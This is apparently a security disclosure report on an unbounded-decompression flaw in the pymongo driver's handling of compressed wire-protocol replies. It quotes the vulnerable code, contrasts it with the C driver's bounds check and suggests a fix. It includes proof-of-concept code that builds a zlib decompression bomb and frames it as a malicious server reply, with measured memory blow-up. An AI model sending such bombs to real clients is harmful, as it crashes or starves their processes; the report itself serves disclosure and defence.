# Title

Unbounded decompression of `OP_COMPRESSED` wire-protocol replies (`pymongo/compression_support.py::decompress()`) allows a malicious or compromised server to force multi-gigabyte memory allocation from a single reply of a few megabytes — a decompression-bomb DoS, reachable via any ordinary operation once wire compression is negotiated

## Summary

When a `pymongo` client is configured with wire-protocol compression (`compressors=zlib`, `snappy`, or `zstd` — an officially documented, commonly-recommended performance option), a MongoDB server (or an on-path attacker able to tamper with the connection when TLS is not used/verified) may reply to **any** normal operation with an `OP_COMPRESSED` message. `pymongo/network_layer.py` reads that message's 9-byte compression header (`originalOpcode`, `uncompressedSize`, `compressorId`), **discards the `uncompressedSize` field entirely**, and passes the compressed payload straight to `pymongo/compression_support.py::decompress()`, which calls the one-shot, unbounded `zlib.decompress()` / `snappy.uncompress()` / `zstd.decompress()` APIs with no output-size limit whatsoever.

Because `zlib` (and the other supported codecs) can achieve compression ratios above 1000:1 on adversarially-chosen input, an attacker can send a compressed blob of a few megabytes — comfortably inside any message-size limit — that decompresses to **up to ~2 GiB in a single message** (the field is a signed 32-bit integer, so that is the wire format's own ceiling; nothing stops a malicious server from sending this repeatedly, once per reply, for cumulative effect). I built a minimal malicious "server" and confirmed empirically that a **1,943,919-byte** (< 1.9 MB) wire payload forces `pymongo`'s own `decompress()` function to allocate a **2,000,000,000-byte (1.86 GiB)** Python `bytes` object, taking **18.84 seconds** and raising the interpreter's RSS from 29 MB to 3.76 GiB — a **>1000x** amplification from bytes-on-the-wire to bytes-in-memory, for one reply to one ordinary command.

Notably, MongoDB's own C driver (`mongo-c-driver`) gets this right: `mcd_rpc_message_decompress()` in `mongoc-cluster.c` explicitly validates the claimed `uncompressedSize` against the connection's negotiated `maxMessageSizeBytes` **before** allocating any buffer or calling into the decompressor, rejecting the message outright if it's out of range. `pymongo` has no equivalent check anywhere in its decompression path — the `uncompressedSize` field is read and then silently thrown away.

## Weakness

CWE-409 (Improper Handling of Highly Compressed Data / "decompression bomb") → uncontrolled memory allocation → process-level denial of service (OOM kill, or severe unresponsiveness under memory pressure).

## Authentication Required

**None, from the attacker's side.** The attacker is the server side of the connection (a malicious/compromised `mongod`/`mongos`, a rogue node reached via a poisoned DNS/SRV record, or an on-path attacker when TLS is not enforced/verified). No valid MongoDB credentials are needed — the bomb fires while the client is decoding the wire-protocol reply, before the reply's payload is ever interpreted as a command result, so it affects the connection regardless of the operation's own privilege level. It requires only that the client has wire compression enabled (`compressors=zlib`/`snappy`/`zstd` in the connection string or `MongoClient(...)` kwargs) — an officially supported, commonly-recommended option, not an obscure or discouraged one.

## Component / Version

- Repository: `mongodb/mongo-python-driver` (HackerOne scope: **Python Driver / PyMongo**)
- Tag audited: `4.17.0` (confirmed latest tag by both `git tag --sort=-v:refname` and `--sort=-creatordate`; also checked for any un-tagged, non-numeric release tags — none found)
- Commit: [`f2103a95870ab5c00b436f757cbaeb86a1047679`](https://github.com/mongodb/mongo-python-driver/commit/f2103a95870ab5c00b436f757cbaeb86a1047679)
- Confirmed with a from-source build (`pip install -e .`) against Python 3.11.15, with the `_cbson`/`_cmessage` C extensions built (`bson.has_c()` returns `True`).

## Root cause, with links to the exact code

[`pymongo/network_layer.py#L658-L661`](https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/network_layer.py#L658-L661):

```python
def process_compression_header(self) -> tuple[int, int]:
    """Unpack a MongoDB Wire Protocol compression header."""
    op_code, _, compressor_id = _UNPACK_COMPRESSION_HEADER(self._compression_header)
    return op_code, compressor_id
```

[`pymongo/network_layer.py#L67`](https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/network_layer.py#L67):

```python
_UNPACK_COMPRESSION_HEADER = struct.Struct("<iiB").unpack
```

`<iiB>` is exactly the OP_COMPRESSED compression header per the wire protocol spec: `int32 originalOpcode; int32 uncompressedSize; uint8 compressorId`. **The middle field — `uncompressedSize` — is unpacked and immediately discarded** (bound to `_` at both call sites: [line 660](https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/network_layer.py#L660) for the asyncio transport, and [line 775](https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/network_layer.py#L775) for the classic synchronous socket path). It is never compared against `max_message_size`, never used to bound an allocation, and never passed to a size-limited decompress call.

The compressed payload then goes straight to [`pymongo/compression_support.py#L166-L187`](https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/compression_support.py#L166-L187):

```python
def decompress(data: bytes | memoryview, compressor_id: int) -> bytes:
    if compressor_id == SnappyContext.compressor_id:
        import snappy
        return snappy.uncompress(bytes(data))
    elif compressor_id == ZlibContext.compressor_id:
        import zlib
        return zlib.decompress(data)          # <-- one-shot, unbounded output
    elif compressor_id == ZstdContext.compressor_id:
        ...
        return zstd.decompress(data)          # <-- one-shot, unbounded output
    else:
        raise ValueError("Unknown compressorId %d" % (compressor_id,))
```

`zlib.decompress()`, `snappy.uncompress()`, and `zstd.decompress()` (one-shot form) all fully materialize their output in memory before returning, with **no caller-supplied limit on the output size**. None of the three branches passes any kind of `max_length`/output-size bound, even though Python's own `zlib` module supports one (`zlib.decompressobj().decompress(data, max_length)`), as does `zstandard`'s streaming API and `snappy`'s streaming decompressor.

Compare this to MongoDB's own C driver, [`src/libmongoc/src/mongoc/mongoc-cluster.c` (`mcd_rpc_message_decompress`)](https://github.com/mongodb/mongo-c-driver/blob/2.5.1/src/libmongoc/src/mongoc/mongoc-cluster.c), which gets this exactly right:

```c
const int32_t uncompressed_size = mcd_rpc_op_compressed_get_uncompressed_size(rpc);

// Malformed message: invalid uncompressedSize.
if (BSON_UNLIKELY(uncompressed_size < 0 || mlib_cmp(uncompressed_size, >, max_msg_size - message_header_length))) {
   return false;
}
```

The C driver validates the claimed `uncompressedSize` against the connection's negotiated `maxMessageSizeBytes` **before** allocating any buffer, then decompresses into a buffer of exactly that (now-bounded) size using the bounded forms of `uncompress()`/`ZSTD_decompress()`/`snappy_uncompress()` (all three take a fixed-size destination buffer and fail rather than overrun it). `pymongo` has no equivalent check anywhere in its decompression path.

## Steps to Reproduce

Built `4.17.0` from source (`pip install -e .`) against Python 3.11.15; confirmed the C extension (`bson.has_c()` → `True`).

**1. Precompute a zlib "bomb"** — a tiny compressed blob that expands to just under the OP_COMPRESSED wire format's `int32` ceiling for `uncompressedSize`:

```python
import zlib
target = 2_000_000_000  # bytes, just under INT32_MAX
raw = b"\x00" * target
compressed = zlib.compress(raw, level=9)
# compressed is ~1.9 MB; ratio ~1029:1
```

**2. Minimal malicious server** (full script in this directory as `evil_server.py`): accepts the client's initial (uncompressed) legacy `OP_QUERY` hello handshake, replies with a normal-looking hello document that advertises `"compression": ["zlib"]`, then on the client's very next request replies with a hand-built `OP_COMPRESSED` message wrapping the precomputed bomb:

```python
comp_header = struct.pack("<iiB", original_opcode, uncompressed_size, compressor_id=2)
body = comp_header + compressed_bomb_bytes
header = struct.pack("<iiii", 16 + len(body), request_id, response_to, 2012)  # OP_COMPRESSED
conn.sendall(header + body)
```

**3. Victim client** (`victim_client.py` in this directory) connects with `compressors=zlib` and issues an ordinary `client.admin.command("ping")`.

**Isolated confirmation, calling the exact vulnerable function directly** (removes all confounding variables — connection setup, retries, etc.):

```
$ python3 -c "
import resource, time
data = open('bomb_2gb.zlib','rb').read()
print('compressed size on wire:', len(data))
from pymongo.compression_support import decompress
before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
t0 = time.time()
out = decompress(data, 2)  # 2 == zlib compressor_id
t1 = time.time()
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print(f'decompress() took {t1-t0:.2f}s')
print(f'output length: {len(out)} bytes ({len(out)/1024/1024/1024:.2f} GiB)')
print(f'RSS before: {before/1024/1024:.3f} GiB, after: {after/1024/1024:.3f} GiB')
print(f'amplification: {len(out)/len(data):.0f}x the bytes actually sent on the wire')
"
compressed size on wire: 1943919
decompress() took 18.84s
output length: 2000000000 bytes (1.86 GiB)
RSS before: 0.029 GiB, after: 3.755 GiB
amplification: 1029x the bytes actually sent on the wire
```

**End-to-end confirmation through the real network path** (malicious server → `MongoClient.admin.command("ping")`, client's virtual memory capped at ~1.4 GiB via `ulimit -v` purely so the demo fails safely instead of consuming the host's RAM):

```
[server] sending OP_COMPRESSED: wire bytes=1943944 compressed_payload=1943919 claimed_uncompressed=2000000000 (compression ratio 1029:1)
[client] EXCEPTION after ~9.0s: AutoReconnect: 127.0.0.1:27756: [Errno 104] Connection reset by peer ...
[client] peak RSS observed: 1.07 GiB (1126632 KB)
```

The client's memory visibly balloons by over a gigabyte, and the operation fails outright, from a single ~1.9 MB reply to a `ping`.

## Impact

Any `pymongo` application connecting to a server it does not fully trust — a malicious or compromised cluster member, a proxy, a poisoned DNS/SRV record, or an on-path attacker when TLS is not enforced/verified — with wire compression enabled can be forced to allocate up to ~2 GiB of memory from a single ~1.9 MB reply to **any** ordinary operation (a `ping`, a `find`, a `hello` refresh, anything that gets a reply). Nothing prevents the same malicious server from repeating this on every subsequent reply, on every connection in the pool, compounding the effect well beyond a single 2 GiB spike. Depending on the host's available memory this results in the Python process being OOM-killed, the host's memory becoming exhausted for other co-located processes, or the client hanging for many seconds fully occupying a CPU core just materializing (and then discarding) data it never asked for. This is a real, currently-unpatched (in the latest tag) resource-exhaustion vulnerability in official, widely-deployed driver code, and it stands in clear contrast to the correct, already-shipped defense in MongoDB's own C driver against exactly this attack.

## Suggested Fix

In `pymongo/network_layer.py`, stop discarding the `uncompressedSize` field from the OP_COMPRESSED header. Validate it against the connection's negotiated `max_message_size` (already threaded through `read()`/`receive_message()`) before calling `decompress()`, rejecting the message with a `ProtocolError` if it exceeds that bound — mirroring exactly what `mongo-c-driver`'s `mcd_rpc_message_decompress()` already does. As defense in depth, `pymongo/compression_support.py::decompress()` should also use the bounded/streaming forms of each codec's API (`zlib.decompressobj().decompress(data, max_length=...)`, snappy's streaming decompressor, `zstd`'s `max_output_size`/streaming decompressor) so that even a caller that fails to pre-validate `uncompressedSize` cannot be tricked into an unbounded allocation.

## Supporting Material

- Discarded `uncompressedSize` field: https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/network_layer.py#L658-L661 and https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/network_layer.py#L775
- Unbounded one-shot decompression: https://github.com/mongodb/mongo-python-driver/blob/f2103a95870ab5c00b436f757cbaeb86a1047679/pymongo/compression_support.py#L166-L187
- Correct comparison behavior in mongo-c-driver (already shipped, not a suggestion for this report — cited only to show the fix is already known-good practice within MongoDB's own drivers): `mcd_rpc_message_decompress()` in `mongoc-cluster.c`, tag `2.5.1`
- `evil_server.py`, `victim_client.py`, `bomb_2gb.zlib` (included in this directory) — full working end-to-end PoC
